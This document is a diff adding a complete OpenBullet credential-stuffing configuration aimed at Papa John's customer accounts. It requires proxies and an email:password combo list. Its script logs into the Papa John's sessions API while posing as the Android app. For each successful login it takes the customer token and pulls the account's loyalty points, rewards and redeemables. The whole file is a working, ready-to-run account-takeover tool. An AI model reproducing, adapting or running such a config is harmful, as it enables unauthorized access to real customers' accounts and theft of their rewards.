@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "papajohns",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-03T21:44:10.2193811+01:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1703445757
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1463423311
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 2005299090
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 524399821
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.papajohns.com/api/v3/sessions" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":true}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: PJA4.19.11225" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "ADRUM_1: isMobile:true" 
+  HEADER "pj-client-app: ANDROID" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "code\":\"UNAUTHORIZED" 
+  KEYCHAIN Success OR 
+    KEY "customerToken\":\"" 
+#PARSE_customerId PARSE "<SOURCE>" LR "customerId\":" ",\"" -> VAR "customerId" 
+#PARSE_customerToken PARSE "<SOURCE>" LR "customerToken\":\"" "\"" -> VAR "customerToken" 
+#PARSE_pointsAvailable PARSE "<SOURCE>" LR "pointsAvailable\":" ",\"" -> CAP "pointsAvailable" 
+REQUEST GET "https://www.papajohns.com/api/v4/loyalty/balance/<customerId>?storeId=1850" 
+  
+  HEADER "User-Agent: PJA4.19.11225" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "ADRUM_1: isMobile:true" 
+  HEADER "pj-authorization: <customerToken>" 
+  HEADER "pj-client-app: ANDROID" 
+#PARSE_netBalance PARSE "<SOURCE>" LR "netBalance\":" ",\"" -> CAP "netBalance" 
+#PARSE_bankedRewards PARSE "<SOURCE>" LR "bankedRewards\":" ",\"" -> CAP "bankedRewards" 
+#PARSE_pendingPoints PARSE "<SOURCE>" LR "pendingPoints\":" ",\"" -> CAP "pendingPoints" 
+#PARSE_currentRewardProgress PARSE "<SOURCE>" LR "currentRewardProgress\":" ",\"" -> CAP "currentRewardProgress" 
+#PARSE_rewards PARSE "<SOURCE>" LR "rewards\":" ",\"" -> CAP "rewards" 
+#PARSE_redeemables PARSE "<SOURCE>" LR "redeemables\":" ",\"" -> CAP "redeemables" 
